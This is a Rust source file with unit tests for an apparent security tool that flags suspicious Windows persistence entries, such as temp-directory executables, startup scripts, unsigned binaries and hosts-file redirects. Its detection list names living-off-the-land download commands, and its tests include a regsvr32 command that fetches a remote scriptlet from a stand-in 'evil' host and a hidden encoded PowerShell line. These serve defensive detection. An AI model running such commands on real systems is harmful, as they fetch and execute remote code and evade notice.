//! Heuristics that turn a [`PersistenceEntry`] into threat evidence.
//!
//! A persistence entry only becomes a detection when at least one heuristic
//! fires — benign autostart entries are not reported (avoids flooding).

use aegis_detect::heuristics as detect_heur;
use aegis_detect::ThreatEvidence;

use crate::model::{PersistenceEntry, PersistenceKind};

/// Substrings (lowercased) marking a temp/throwaway directory.
const TEMP_MARKERS: &[&str] = &[
    "\\temp\\",
    "\\appdata\\local\\temp",
    "\\windows\\temp",
    "%temp%",
    "/tmp/",
];

/// Script extensions that are suspicious in autostart locations.
const SCRIPT_EXTS: &[&str] = &["ps1", "vbs", "vbe", "js", "jse", "bat", "cmd", "hta", "wsf"];

const EXECUTABLE_EXTS: &[&str] = &["exe", "scr", "com", "pif", "dll", "sys", "bat", "cmd"];

/// Living-off-the-land / abuse command-line patterns (lowercased).
const LOLBIN_PATTERNS: &[&str] = &[
    "regsvr32 /i:http",
    "regsvr32 /s /n /u /i:http",
    "mshta http",
    "mshta javascript",
    "mshta vbscript",
    "certutil -urlcache",
    "certutil  -decode",
    "bitsadmin /transfer",
    "wmic process call create",
    "rundll32 javascript:",
    "-windowstyle hidden",
    "-w hidden",
    "frombase64string",
];

/// Domains whose redirection in the hosts file is high-impact.
const SENSITIVE_DOMAINS: &[&str] = &[
    "windowsupdate",
    "microsoft",
    "update.microsoft",
    "google",
    "mcafee",
    "symantec",
    "defender",
    "bank",
];

/// Extract the image path (first token) from a command line, stripping quotes.
fn image_path(command: &str) -> String {
    let trimmed = command.trim();
    if let Some(rest) = trimmed.strip_prefix('"') {
        if let Some(end) = rest.find('"') {
            return rest[..end].to_string();
        }
    }
    trimmed.split_whitespace().next().unwrap_or("").to_string()
}

fn ext_of(path: &str) -> Option<String> {
    let name = path.rsplit(['\\', '/']).next().unwrap_or(path);
    name.rsplit_once('.').map(|(_, e)| e.to_ascii_lowercase())
}

fn is_temp(path_lower: &str) -> bool {
    TEMP_MARKERS.iter().any(|m| path_lower.contains(m))
}

/// Analyze a single entry. Returns evidence (empty = benign / not reported).
pub fn analyze_entry(entry: &PersistenceEntry) -> Vec<ThreatEvidence> {
    let mut ev = Vec::new();
    let cmd_lower = entry.command.to_ascii_lowercase();
    let path = image_path(&entry.command);
    let path_lower = path.to_ascii_lowercase();
    let ext = ext_of(&path);

    // Executable in a temp directory.
    if is_temp(&path_lower)
        && ext.as_deref().map(|e| EXECUTABLE_EXTS.contains(&e)).unwrap_or(false)
    {
        ev.push(ThreatEvidence::SuspiciousLocation {
            path: path.clone(),
            reason: "executable in temp directory".into(),
        });
    }

    // Script in a startup location.
    if entry.kind == PersistenceKind::StartupEntry {
        if let Some(e) = &ext {
            if SCRIPT_EXTS.contains(&e.as_str()) {
                ev.push(ThreatEvidence::SuspiciousLocation {
                    path: path.clone(),
                    reason: "script in startup folder".into(),
                });
                ev.push(ThreatEvidence::SuspiciousExtension { ext: e.clone() });
            }
        }
    }

    // Unsigned executable.
    if entry.signed == Some(false)
        && ext.as_deref().map(|e| EXECUTABLE_EXTS.contains(&e)).unwrap_or(false)
    {
        ev.push(ThreatEvidence::SuspiciousLocation {
            path: path.clone(),
            reason: "unsigned binary".into(),
        });
    }

    // PowerShell abuse in the command line.
    for indicator in detect_heur::powershell_indicators(entry.command.as_bytes()) {
        ev.push(ThreatEvidence::PowerShellIndicator { indicator });
    }
    if cmd_lower.contains("-enc") || cmd_lower.contains("-encodedcommand") {
        ev.push(ThreatEvidence::PowerShellIndicator { indicator: "encodedcommand".into() });
    }

    // LOLBin / suspicious command line.
    if let Some(pat) = LOLBIN_PATTERNS.iter().find(|p| cmd_lower.contains(**p)) {
        ev.push(ThreatEvidence::SuspiciousLocation {
            path: entry.command.clone(),
            reason: format!("suspicious command line: {pat}"),
        });
    }

    // Hosts-file redirect.
    if entry.kind == PersistenceKind::HostsFileModification {
        ev.extend(hosts_evidence(entry));
    }

    // Sideloaded / unpacked browser extension.
    if entry.kind == PersistenceKind::BrowserExtension {
        let d = entry.detail.to_ascii_lowercase();
        if entry.signed == Some(false)
            || ["unpacked", "sideload", "development", "external", "registry"]
                .iter()
                .any(|m| d.contains(m))
        {
            ev.push(ThreatEvidence::SuspiciousLocation {
                path: entry.location.clone(),
                reason: "sideloaded/unpacked browser extension".into(),
            });
        }
    }

    // Only report persistence context when something suspicious was found.
    if !ev.is_empty() {
        ev.insert(
            0,
            ThreatEvidence::PersistenceMechanism {
                mechanism: entry.kind.mechanism().to_string(),
                name: entry.name.clone(),
                detail: if entry.location.is_empty() {
                    entry.command.clone()
                } else {
                    entry.location.clone()
                },
            },
        );
    }
    ev
}

fn hosts_evidence(entry: &PersistenceEntry) -> Vec<ThreatEvidence> {
    let mut ev = Vec::new();
    let ip = entry.command.trim();
    let host = entry.name.to_ascii_lowercase();
    let loopback = ip.starts_with("127.") || ip == "::1" || ip == "0.0.0.0";
    let sensitive = SENSITIVE_DOMAINS.iter().any(|d| host.contains(d));

    if sensitive {
        ev.push(ThreatEvidence::SuspiciousLocation {
            path: format!("{} -> {ip}", entry.name),
            reason: "hosts file overrides a sensitive domain".into(),
        });
    } else if !loopback {
        ev.push(ThreatEvidence::SuspiciousLocation {
            path: format!("{} -> {ip}", entry.name),
            reason: "hosts file redirect to non-loopback address".into(),
        });
    }
    ev
}

#[cfg(test)]
mod tests {
    use super::*;

    fn entry(kind: PersistenceKind, cmd: &str) -> PersistenceEntry {
        PersistenceEntry::new(kind, "x", cmd, "HKCU\\...\\Run")
    }

    #[test]
    fn temp_executable_flagged() {
        let e = entry(PersistenceKind::RegistryRunKey, "C:\\Users\\a\\AppData\\Local\\Temp\\x.exe");
        let ev = analyze_entry(&e);
        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::PersistenceMechanism { .. })));
    }

    #[test]
    fn benign_run_key_not_reported() {
        let e = entry(PersistenceKind::RegistryRunKey, "\"C:\\Program Files\\App\\app.exe\" --tray");
        assert!(analyze_entry(&e).is_empty());
    }

    #[test]
    fn encoded_powershell_flagged() {
        let e = entry(
            PersistenceKind::ScheduledTask,
            "powershell.exe -nop -w hidden -enc SQBFAFgA",
        );
        let ev = analyze_entry(&e);
        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::PowerShellIndicator { .. })));
    }

    #[test]
    fn script_in_startup_flagged() {
        let mut e = entry(PersistenceKind::StartupEntry, "C:\\Startup\\evil.vbs");
        e.location = "Startup".into();
        let ev = analyze_entry(&e);
        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousExtension { .. })));
    }

    #[test]
    fn lolbin_cmdline_flagged() {
        let e = entry(
            PersistenceKind::RegistryRunOnce,
            "regsvr32 /s /n /u /i:http://evil/x.sct scrobj.dll",
        );
        let ev = analyze_entry(&e);
        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
    }

    #[test]
    fn hosts_sensitive_redirect_flagged() {
        let mut e = PersistenceEntry::new(
            PersistenceKind::HostsFileModification,
            "www.update.microsoft.com",
            "10.0.0.5",
            "hosts",
        );
        e.detail = "10.0.0.5 www.update.microsoft.com".into();
        let ev = analyze_entry(&e);
        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
    }

    #[test]
    fn unsigned_binary_flagged() {
        let e = PersistenceEntry::new(PersistenceKind::ServicePersistence, "svc", "C:\\x\\bad.exe", "services")
            .with_signed(Some(false));
        let ev = analyze_entry(&e);
        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
    }
}
